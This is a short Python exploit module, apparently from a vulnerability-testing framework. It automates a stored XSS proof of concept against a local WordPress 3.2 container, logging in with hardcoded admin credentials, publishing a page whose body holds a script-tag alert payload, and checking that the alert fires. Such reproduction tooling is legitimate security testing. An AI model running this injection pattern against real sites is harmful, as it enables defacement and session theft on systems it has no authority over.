from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'Wordpress_3_2_XSS',
      'Description' : "XSS vulnerabiity in Wordpress application",
      'References' :  [["empty"]], 
      'Target' :      "Wordpress3.2",
      'Container': 'ubuntu-apache-mysql',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'XSS'
    }

    def runExploit(self):
        wrapper = self.wrapper
        wrapper.navigate("http://localhost:49160/wordpress/wp-login.php")
        login_elt = wrapper.find("user_login")
        login_elt.clear()
        login_elt.keys(" wpadmin")
        pass_elt = wrapper.find("user_pass")
        pass_elt.clear()
        pass_elt.keys("wpadminpw21")
        wrapper.find("wp-submit").click()
        wrapper.implicit_wait(5)

        wrapper.navigate("http://localhost:49160/wordpress/wp-admin/post-new.php?post_type=page")
        title_elt = wrapper.find("title")
        title_elt.clear()
        title_elt.keys("Hacked content")

        content_elt = wrapper.find("content")
        content_elt.clear()
        content_elt.keys("<script>alert(\"XSS!!\")</script>")
     
        wrapper.find("publish").keys("\n")
        wrapper.implicit_wait(5)
        wrapper.navigate("http://localhost:49160/wordpress/?page_id=23")

        alert_text = wrapper.handle_alert()
        self.assertIn("XSS", alert_text, "Exploit didn't work!")

